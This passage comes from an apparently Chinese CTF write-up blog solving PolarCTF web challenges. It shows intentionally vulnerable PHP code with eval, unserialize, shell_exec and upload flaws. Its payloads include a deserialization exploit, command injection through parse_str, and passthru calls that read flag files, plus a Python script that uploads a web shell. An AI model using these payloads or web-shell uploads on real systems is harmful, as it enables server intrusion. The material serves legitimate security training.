class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Example</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$sys</span><span class="token operator">=</span><span class="token string single-quoted-string">'Can you find the leak?'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sys</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> </code></pre><p>Exp:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Example</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">public</span> <span class="token variable">$sys</span><span class="token operator">=</span><span class="token string single-quoted-string">'system("tac fl*");'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span> </code></pre><h4 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h4><p>MIMEÈôêÂà∂ gif</p><h4 id="cookieÊ¨∫È™ó"><a href="#cookieÊ¨∫È™ó" class="headerlink" title="cookieÊ¨∫È™ó"></a>cookieÊ¨∫È™ó</h4><p>SignIn</p><h4 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$deny_ext</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">,</span><span class="token number">99999</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'‰∏ä‰º†Âá∫ÈîôÔºÅ'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'Êñá‰ª∂Â§π‰∏çÂ≠òÂú®,ËØ∑ÊâãÂ∑•ÂàõÂª∫ÔºÅ'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ÂèåÂÜôÁªïËøá Ê∫êÁ†ÅÈáåÊúâË∑ØÂæÑ</p><p><img src="upload_rand.png" loading="lazy"></p><h4 id="Âπ≤Ê≠£Âàô"><a href="#Âπ≤Ê≠£Âàô" class="headerlink" title="Âπ≤Ê≠£Âàô"></a>Âπ≤Ê≠£Âàô</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"www.baidu.com"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    @<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'www.polarctf.com'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag\.php/'</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"don't show flag!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$result</span> <span class="token operator">.=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ping -c 2 '</span> <span class="token operator">.</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$result</span><span class="token punctuation">&#125;</span></span>&lt;/pre>"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ÂÖ∂ÂÆûÂæàÁÆÄÂçïÔºÅ'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span></code></pre><p><strong>parse_str()</strong> ÂáΩÊï∞ÊääÊü•ËØ¢Â≠óÁ¨¶‰∏≤Ëß£ÊûêÂà∞ÂèòÈáè‰∏≠„ÄÇ</p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>id<span class="token operator">=</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>www<span class="token operator">.</span>polarctf<span class="token operator">.</span>com<span class="token operator">&amp;</span>cmd<span class="token operator">=</span><span class="token operator">|</span><span class="token class-name">tac</span> f<span class="token operator">*</span></code></pre><h4 id="cool"><a href="#cool" class="headerlink" title="cool"></a>cool</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php/i"</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>‰∏çÁêÜËß£ is_numeric ÁöÑÊÑè‰πâ</p><p>Payload: <code>?a=passthru(&#39;tac f*&#39;);</code></p><h4 id="uploader"><a href="#uploader" class="headerlink" title="uploader"></a>uploader</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$sandBox</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$sandBox</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandBox</span><span class="token punctuation">,</span><span class="token number">0755</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$sandBox</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"‰∏ä‰º†Êñá‰ª∂Âêç: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Êñá‰ª∂Á±ªÂûã: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Êñá‰ª∂Â§ßÂ∞è: "</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" kB&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$sandBox</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></code></pre><ol><li><p>1.<code>$sandBox = md5($_SERVER[&#39;REMOTE_ADDR&#39;]);</code>ËøôË°å‰ª£Á†ÅÈÄöËøáMD5ÂìàÂ∏åÂáΩÊï∞Â§ÑÁêÜÁî®Êà∑ÁöÑIPÂú∞ÂùÄÔºà<code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>ÔºâÔºåÁîüÊàê‰∏Ä‰∏™32‰ΩçÁöÑÂçÅÂÖ≠ËøõÂà∂Â≠óÁ¨¶‰∏≤„ÄÇËøô‰∏™Â≠óÁ¨¶‰∏≤Â∞ÜÁî®‰ΩúÁõÆÂΩïÂêç„ÄÇ</p></li><li><p>2.<code>if(!is_dir($sandBox))&#123;</code>ËøôË°å‰ª£Á†ÅÊ£ÄÊü•Áî±MD5ÂìàÂ∏åÁîüÊàêÁöÑÁõÆÂΩïÂêçÊòØÂê¶Â∑≤Â≠òÂú®„ÄÇ<code>is_dir()</code>ÂáΩÊï∞Áî®‰∫éÊ£ÄÊü•ÊåáÂÆöË∑ØÂæÑÊòØÂê¶‰∏∫ÁõÆÂΩï„ÄÇÂ¶ÇÊûú‰∏çÊòØÁõÆÂΩïÔºàÂç≥‰∏çÂ≠òÂú®ÔºâÔºåÂàôÊâßË°åÊé•‰∏ãÊù•ÁöÑ‰ª£Á†Å„ÄÇ</p></li><li><p>3.<code>mkdir($sandBox,0755,true);</code>Â¶ÇÊûúÁõÆÂΩï‰∏çÂ≠òÂú®Ôºå<code>mkdir()</code>ÂáΩÊï∞Â∞ÜÂàõÂª∫‰∏Ä‰∏™Êñ∞ÁõÆÂΩï„ÄÇÊùÉÈôêËÆæÁΩÆ‰∏∫<code>0755</code>ÔºàÂç≥ÊâÄÊúâËÄÖÊúâËØª„ÄÅÂÜôÂíåÊâßË°åÊùÉÈôêÔºåÁªÑÂíåÂÖ∂‰ªñÁî®Êà∑ÊúâËØªÂíåÊâßË°åÊùÉÈôêÔºâ„ÄÇ<code>true</code>ÂèÇÊï∞Ë°®Á§∫ÂàõÂª∫Â§öÁ∫ßÁõÆÂΩïÔºåÂ¶ÇÊûú‰∏≠Èó¥ÁöÑÊüê‰∏™ÁõÆÂΩï‰∏çÂ≠òÂú®Ôºå‰πü‰ºö‰∏ÄÂπ∂ÂàõÂª∫„ÄÇ</p></li><li><p>4.<code>if($_FILES)&#123;</code>ËøôË°å‰ª£Á†ÅÊ£ÄÊü•ÊòØÂê¶ÊúâÊñá‰ª∂‰∏ä‰º†„ÄÇ<code>$_FILES</code>ÊòØ‰∏Ä‰∏™ÂÖ®Â±ÄÊï∞ÁªÑÔºåÂåÖÂê´‰∫ÜÈÄöËøáHTTP POST‰∏ä‰º†ÁöÑÊñá‰ª∂‰ø°ÊÅØ„ÄÇ</p></li><li><p>5.<code>move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name],$sandBox.&quot;/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]);</code>Â¶ÇÊûúÊúâÊñá‰ª∂‰∏ä‰º†Ôºå<code>move_uploaded_file()</code>ÂáΩÊï∞Â∞Ü‰∏ä‰º†ÁöÑÊñá‰ª∂‰ªé‰∏¥Êó∂ÁõÆÂΩïÁßªÂä®Âà∞Áî±MD5ÂìàÂ∏åÁîüÊàêÁöÑÁõÆÂΩï‰∏≠„ÄÇ<code>$_FILES[&#39;file&#39;][&#39;tmp_name&#39;]</code>ÊòØ‰∏ä‰º†Êñá‰ª∂Âú®ÊúçÂä°Âô®‰∏äÁöÑ‰∏¥Êó∂Êñá‰ª∂ÂêçÔºå<code>$sandBox.&quot;/&quot;.&quot;$_FILES[&quot;file&quot;][&quot;name&quot;]</code>ÊòØÁõÆÊ†áÊñá‰ª∂Ë∑ØÂæÑÔºåÂç≥Êñ∞ÂàõÂª∫ÁöÑÁõÆÂΩïÂä†‰∏äÂéüÂßãÊñá‰ª∂Âêç„ÄÇ</p></li><li><p>6.<code>echo &quot;‰∏ä‰º†Êñá‰ª∂Âêç: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br&gt;&quot;;</code>ËæìÂá∫‰∏ä‰º†Êñá‰ª∂ÁöÑÂêçÁß∞„ÄÇ</p></li><li><p>7.<code>echo &quot;Êñá‰ª∂Á±ªÂûã: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br&gt;&quot;;</code>ËæìÂá∫‰∏ä‰º†Êñá‰ª∂ÁöÑMIMEÁ±ªÂûã„ÄÇ</p></li><li><p>8.<code>echo &quot;Êñá‰ª∂Â§ßÂ∞è: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; kB&lt;br&gt;&quot;;</code>ËæìÂá∫‰∏ä‰º†Êñá‰ª∂ÁöÑÂ§ßÂ∞èÔºåÂçï‰Ωç‰ªéÂ≠óËäÇËΩ¨Êç¢‰∏∫ÂçÉÂ≠óËäÇÔºàKBÔºâ„ÄÇ</p></li><li><p>9.<code>echo $sandBox;</code>ËæìÂá∫ÂàõÂª∫ÁöÑÁõÆÂΩïÂêç„ÄÇ</p></li></ol><p>ÊâãÂä®‰∏ä‰º†‰∏™È©¨Â≠ê ÁÑ∂ÂêérceÂ∞±Ë°å</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://07f244aa-014e-4336-95be-997f5f132778.www.polarctf.com:8090/"</span><span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'D:/CTF/upload/1.php'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span> <span class="token builtin">file</span><span class="token punctuation">&#125;</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Upload failed"</span><span class="token punctuation">)</span></code></pre><h4 id="Ë¶ÜÁõñ"><a href="#Ë¶ÜÁõñ" class="headerlink" title="Ë¶ÜÁõñ"></a>Ë¶ÜÁõñ</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"www.baidu.com"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    @<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'www.polarctf.com'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">.=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ping -c 2 '</span> <span class="token operator">.</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$result</span><span class="token punctuation">&#125;</span></span>&lt;/pre>"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ÂÖ∂ÂÆûÂæàÁÆÄÂçïÔºÅ'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>Ôºü È¢ò‰∏ÄÁÇπÂÑøÊ≤°Êîπ</p><h4 id="PHPÂèçÂ∫èÂàóÂåñÂàùËØï"><a href="#PHPÂèçÂ∫èÂàóÂåñÂàùËØï" class="headerlink" title="PHPÂèçÂ∫èÂàóÂåñÂàùËØï"></a>PHPÂèçÂ∫èÂàóÂåñÂàùËØï</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Easy</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Evil</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$evil</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$env</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">env</span><span class="token operator">=</span><span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evil</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">env</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'easy'</span><span class="token punctuation">]</span><span class="token 